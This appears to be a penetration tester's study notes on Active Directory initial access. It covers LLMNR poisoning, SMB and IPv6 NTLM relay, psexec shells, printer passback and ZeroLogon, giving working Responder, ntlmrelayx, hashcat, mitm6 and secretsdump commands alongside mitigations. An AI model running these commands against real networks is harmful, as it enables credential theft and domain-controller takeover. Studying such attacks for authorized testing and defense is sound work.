# Active Directory: Initial Attack Vectors

--- 

### LLMNR Poisoning 

> LLMNR is used to identify hosts when DNS fails. However, the service utilizes a user's username and NTLMv2 hash when responded to. LLMNR poisoning is a MITM attack which captures NTLMv2 hashes traversing a corporate network to either crack them or use them in other attacks.

1. run Responder 
	- usage: `sudo responder -I <iface> -rdw`
	- the `<iface>` is the interface you want to listen on 
	- i.e. `sudo responder -I tun0 -rdw`
	- if you capture the hash and want to see it again use the `-v` (verbose) flag
2. an event occurs (which DNS cannot resolve)
	- typically run Responder at the start of the day or during lunch (when most people are logging back in or accessing resources again) to capture events
	- i.e. someone tries to connect to your machine via SMB, SQL, FTP, SMTP, etc.
3. Responder captures the hashes and displays them 
4. crack the hash 
	- i.e. with hashcat: `hashcat -m 5600 hashes.txt rockyout.txt -O`
	- i.e. with john: `john hash.txt --wordlist=rockyou.txt --format=netntlmv2`
	- you should run your password cracking program on your base OS or a specialist rig 

> Best defense is to disable LLMNR and NBT-NS. If you cannot do this then require Network Access Control and the use of strong user passwords. 


<br>

### SMB Relay Attacks

> Instead of cracking hashes gathered with Responder, you relay those hashes to specific machines and potentially gain access. This requires SMB signing to be disabled on the target and the relayed user credentials must be admin on machine.

1. find out what machines in the network have SMB signing disabled 
	- with nmap: `nmap --script=smb2-security-mode.nse -p445 <subnet>`
	- save the hosts were SMB signing is disabled to a file called `targets.txt`
2. configure Responder
	- turn off SMB and HTTP in the Resonder.conf file so that Responder just listens and does not respond back 
3. run Responder with `responder -I tun0 -rdw`
4. setup "ntlmrelayx" with `impacket-ntlmrelayx -tf targets.txt -smb2support` in another tab
5. wait for an event occurs and DNS fails (like before)
6. Responder this time doesn't respond to that message but, instead, ntlmrelayx relays these credentials to the machine 
	- if the credentials being relayed are admin credentials and the user is an admin on the target machine -- success
	- if successful, sensitive information will then be dumped (i.e. local SAM hashes)
	- use the `-i` option to automatically start a SMB shell when a successful login is made from stolen NTLM hashes -- the output will give you a local port to connect to (i.e. `nc 127.0.0.1 11000`) where you can access this SMB shell 
		- run `help` to view available commands 
		- i.e. `shares` -> `use C$` -> `ls` -> add/delete files, etc. 
	- use `-e` to execute a file on the machine, from which you can execute a reverse shell on the machine
		- i.e. create shell in msfvenom -> setup multi/handler -> execute shell with `impacket-ntlmrelayx -tf targets.txt -smb2support -e shell.exe`
	- use `-c` to execute a specific command on the machine once you connect, this could be a simple `whoami` or a reverse PowerShell shell
		- i.e. `impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"`
		
> Best defense is to: 
> - enable SMB signing on all devices -- completely stops attack but can cause performance issues with file copies
> - disable NTLM authentication on the network -- if Kerberos fails then Windows will default back to NTLM anyway so not fail safe
> - perform account tiering to limit domain admins to specific tasks -- but, this can be a difficult policy to enforce 
> - perform local admin restriction to prevent lateral movement -- but, can increase amount of service desk tickets to resolve some use-case issues 

<br>

### Gaining Shell Access With Credentials 

> Once you have some kind of system credentials you can use these to gain a shell in a variety of ways. Some of these script may fail, some may trigger AV alerts, and some may go unnoticed. These shells may not generate a fully-fledged shell but give you some kind of shell on the system which you can use to disable AV/endpoint protections to then upload a full-fledged shell for post-exploitation.

Use PsExec to get a shell with Metasploit:
- `use exploit/windows/smb/psexec` -> set rhosts, smbdomain, smbpass, smbuser, payload, lhost, lport -> `run` -> retry if it fails first time or use a different "target" (`show targets` -> `set target <#>`)


Use Metasploit's PowerShell PsExec variant:
- `use exploit/windows/smb/psexec_psh` -> set options -> `run`

Use impacket's psexec.py:
- `impacket-psexec <domain>/<user>:<password>@<ip>`
- i.e. `impacket-psexec marvel.local/fcastle:Password1@10.0.2.15`

Use impacket's smbexec.py: 
- ...

Use impacket's wmiexec.py:
- ...


		

<br> 
 
### IPv6 Attacks 

> IPv6 it typically not setup or configured on a network and if LDAP is enabled then it can be abused to relay LDAP hashes and authenticate as domain users to enumerate domain information.

1. install mitm6:
	- `git clone https://github.com/dirkjanm/mitm6` -> `pip3 install .`
2. start mitm6 with the domain you are attacking:
	- `sudo python3 mitm6/mitm6.py -d <domain>`
	- this will then begin to populate with IPv6 requests 
	- i.e. `sudo python3 mitm6/mitm6.py -d marvel.local`
3. start a relay attack
	- `impacket-ntlmrelayx -6 -t ldaps://<domain_controller> -wh <fake WPAD> -l <log_directory>`
	- to speed this up restart a computer (typically IPv6 AD will send a DNS request every 30 minutes)
	- i.e. `impacket-ntlmrelayx -6 -t ldaps://10.0.2.5 -wh fakewpad.marvel.local -l <log_directory>`
4. wait for IPv6 DNS AD event 
	- when a new DNS event occurs the mitm6 tool will capture this and the relay tool will try to relay this to authenticate to machines in the network and dump out information into the specified log directory 
	- this information can be used to map out the network and target accounts 
	- when a user logs into a machine their password will be captured, if it is an administrator user then a new user account will be created on the domain with a special ACL which lets this user access the domain controller

- mitm6: [https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
- Combining NTLM Relays and Kerberos Delegation: [https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)

> Best defense is to: 
> - block DHCPv6 traffic and incoming router advertisements in Windows Firewall via Group Policy. Blocking Ipv6 entirely may have unwanted side effects.
> - if WPAD is not used internally, disable it via Group Policy and by disabling WinHttpAutoProxySvc service.
> - relaying to LDAP and LDAPS can only be mitigated by enabling LDAP signing and LDAP channel binding.
> - move Administrator users to the Protected Users group or marking them as Account is sensitive and cannot be delegated, which will prevent any impersonation of that user via delegation.


<br>

### Passback Attacks 

1. find device that uses LDAP/SMB/SMTP connection to a domain (i.e. a printer) 
2. change it's connection settings to point to your attack machine rather than the domain controller (or LDAP server)
	- the password will be typically asterisked out
3. setup netcat or responder to listen for SMB/LDAP/SMTP connections 
	- i.e. `nc -lvnp 389`
4. the password on connection will be sent over in clear text and can then be used to authenticate -- this is still a common bug for some printers or external devices   

>  A Pen Tester’s Guide to Printer Hacking - [https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/)

<br>

### Other Attack Vectors and Strategies

Internal penetration test process:
- typically, start with mitm6 or Responder to try an capture hashes to relay or crack 
	- are the passwords easy to crack? is LLMNR enabled? is LDAP(S) enabled?
- next, run scans to generate traffic (i.e. nessus, nmap, etc.) and sweep the network for open SMB (with SMB signing disabled) for SMB relay attacks
- if you want to be quite (or scans are taking too long) then look for websites in scope on the network (i.e. with Metasploit module `http_version`) -- less likely to be detected by SIEM 
- use the in-scope websites to check default credentials on web logins (i.e. printers, jenkins, etc.) and use these logins to find further credentials for other machines or to reuse 
- if multiple initial attack vectors fail then use what is available to you; think outside the box, try to capture packets and look for clear text credentials or hashes, focus on enumerating as much information as possible


<br>

### Abusing ZeroLogon (CVE-2020-1472)

> ZeroLogon lets you attack a DC, set the password to null, and takeover the DC. However, this is a dangerous attack because if you don't restore the server when you are done then you brick the DC. You should check with a client before running this. 
> 
> Reference: https://www.trendmicro.com/en_us/what-is/zerologon.html 

1. clone the exploit repository from [here](https://github.com/dirkjanm/CVE-2020-1472), download the latest version of impacket, and get the ZeroLogon checker for enumeration from [here](https://github.com/SecuraBV/CVE-2020-1472)
2. run the ZeroLogon checker to see if a DC is vulnerable to this exploit 
	- usage: `python3 zerologon_tester.py <dc_name> <dc_ip>`
	- i.e. `python3 zerologon_tester.py HYDRA-DC 10.0.2.5`
3. if vulnerable, run the ZeroLogon exploit 
	- usage: `python3 CVE-2020-1472.py <dc_name> <dc_ip>`
	- i.e. `python3 CVE-2020-1472.py HYDRA-DC 10.0.2.5`
4. check if successful by dumping SAM without authentication:
	- usage: `impacket-secretsdump -just-dc <domain>/<dc_name>\$@<dc_ip>`
	- i.e `impacket-secretsdump -just-dc MARVEL/HYDRA-DC\$@<10.0.2.25`
	- if you can dump the SAM, you can then use the hashes to PsExec into it and fully compromise the machine 
5. restore the DC:
	- copy the Administrator hash from the dump and run `impacket-secretsdump administrator@<dc_ip> -hashes <admin_hash>`
	- find "plain_password_hex" and copy it 
	- run `python3 restorepassword.py <domain>/<dc_name>@<dc_name> -target-ip <dc_ip> -hexpass <password_hex>` 